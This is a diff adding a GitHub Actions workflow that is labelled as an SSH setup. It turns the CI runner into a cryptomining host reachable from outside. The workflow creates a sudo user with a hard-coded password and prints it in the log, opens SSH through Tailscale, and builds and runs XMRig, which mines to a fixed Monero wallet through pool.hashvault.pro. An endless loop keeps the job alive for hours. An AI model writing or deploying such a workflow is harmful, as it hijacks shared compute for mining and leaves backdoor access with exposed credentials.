@@ -1,0 +1,160 @@
+name: SSH
+
+on:
+  workflow_dispatch:
+
+jobs:
+  secure-ssh:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3600
+
+    steps:
+      - name: Configure SSH Settings
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openssh-server
+          sudo systemctl enable ssh
+          sudo systemctl start ssh
+          sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo systemctl restart ssh
+          sudo ufw allow 22/tcp
+          echo "SSH configured successfully"
+
+      - name: Create SSH User with Fixed Password
+        run: |
+          PASSWORD="*r96319631P-"
+          sudo useradd -m -s /bin/bash SSH
+          echo "SSH:$PASSWORD" | sudo chpasswd
+          sudo usermod -aG sudo SSH
+          echo "SSH_CREDS=User: SSH | Password: $PASSWORD" >> $GITHUB_ENV
+          if ! id "SSH" &>/dev/null; then
+              echo "User creation failed"
+              exit 1
+          fi
+          echo "User SSH created successfully"
+
+      - name: Install Tailscale
+        run: |
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.noarmor.gpg | sudo tee /usr/share/keyrings/tailscale-archive-keyring.gpg >/dev/null
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.tailscale-keyring.list | sudo tee /etc/apt/sources.list.d/tailscale.list
+          sudo apt-get update
+          sudo apt-get install -y tailscale
+          echo "Tailscale installed successfully"
+
+      - name: Establish Tailscale Connection
+        run: |
+          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$GITHUB_RUN_ID
+          TAILSCALE_IP=""
+          RETRIES=0
+          while [ -z "$TAILSCALE_IP" ] && [ $RETRIES -lt 10 ]; do
+              TAILSCALE_IP=$(tailscale ip -4)
+              sleep 5
+              RETRIES=$((RETRIES + 1))
+          done
+          if [ -z "$TAILSCALE_IP" ]; then
+              echo "Tailscale IP not assigned. Exiting."
+              exit 1
+          fi
+          echo "TAILSCALE_IP=$TAILSCALE_IP" >> $GITHUB_ENV
+          echo "Tailscale connected with IP: $TAILSCALE_IP"
+
+      - name: Verify SSH Accessibility
+        run: |
+          echo "Tailscale IP: $TAILSCALE_IP"
+          sudo systemctl status ssh --no-pager
+          if nc -zv localhost 22 2>&1 | grep -q succeeded; then
+              echo "SSH port 22 is accessible"
+          else
+              echo "SSH port 22 is NOT accessible"
+              exit 1
+          fi
+          echo "SSH connectivity verified successfully"
+
+      - name: Install XMRig
+        run: |
+          sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          cd /home/SSH
+          sudo -u SSH git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          sudo -u SSH mkdir build
+          cd build
+          sudo -u SSH cmake ..
+          sudo -u SSH make -j$(nproc)
+          echo "XMRig compiled successfully"
+
+      - name: Configure XMRig
+        run: |
+          cat > /tmp/config.json << 'EOFCONFIG'
+          {
+              "autosave": true,
+              "cpu": {
+                  "enabled": true,
+                  "huge-pages": true,
+                  "max-threads-hint": 100
+              },
+              "opencl": false,
+              "cuda": false,
+              "pools": [
+                  {
+                      "url": "pool.hashvault.pro:443",
+                      "user": "44A9mpd1SYZNd8v2yLMH7YAtzMrcEr2va5TpA8SH7E6cN4NTUfYeLtXhRZBPFLQGmySaZWYCJNjkVaszdh4AEivA8ZjfnEG",
+                      "pass": "x",
+                      "keepalive": true,
+                      "tls": false
+                  }
+              ]
+          }
+          EOFCONFIG
+          sudo mv /tmp/config.json /home/SSH/xmrig/build/config.json
+          sudo chown SSH:SSH /home/SSH/xmrig/build/config.json
+          echo "XMRig configuration created"
+
+      - name: Start XMRig
+        run: |
+          sudo touch /home/SSH/xmrig.log
+          sudo chown SSH:SSH /home/SSH/xmrig.log
+          cd /home/SSH/xmrig/build
+          sudo -u SSH bash -c 'nohup ./xmrig > /home/SSH/xmrig.log 2>&1 &'
+          sleep 10
+          if pgrep -f "xmrig" > /dev/null; then
+              echo "XMRig started successfully"
+              echo "Process ID: $(pgrep -f xmrig)"
+          else
+              echo "Warning: XMRig may not be running properly"
+              echo "Checking log file:"
+              cat /home/SSH/xmrig.log || echo "Log file is empty or not accessible"
+          fi
+
+      - name: Maintain Connection
+        run: |
+          echo ""
+          echo "=== SSH ACCESS ==="
+          echo "Address: $TAILSCALE_IP"
+          echo "Port: 22"
+          echo "Username: SSH"
+          echo "Password: *r96319631P-"
+          echo "=================="
+          echo ""
+          echo "=== XMRig STATUS ==="
+          echo "XMRig is running in background"
+          echo "Log file: /home/SSH/xmrig.log"
+          echo "Config: /home/SSH/xmrig/build/config.json"
+          echo "===================="
+          echo ""
+          echo "Connect using: ssh SSH@$TAILSCALE_IP"
+          echo "View XMRig log: tail -f /home/SSH/xmrig.log"
+          echo ""
+          while true; do
+              echo "[$(date)] SSH Active | XMRig Status Check"
+              if pgrep -f "xmrig" > /dev/null; then
+                  PID=$(pgrep -f xmrig)
+                  echo "[$(date)] XMRig is RUNNING - PID: $PID"
+                  echo "[$(date)] CPU Usage: $(ps -p $PID -o %cpu= 2>/dev/null || echo 'N/A')%"
+              else
+                  echo "[$(date)] WARNING: XMRig process NOT FOUND!"
+                  echo "[$(date)] Last 10 lines of log:"
+                  tail -n 10 /home/SSH/xmrig.log 2>/dev/null || echo "Cannot read log file"
+              fi
+              sleep 300
+          done
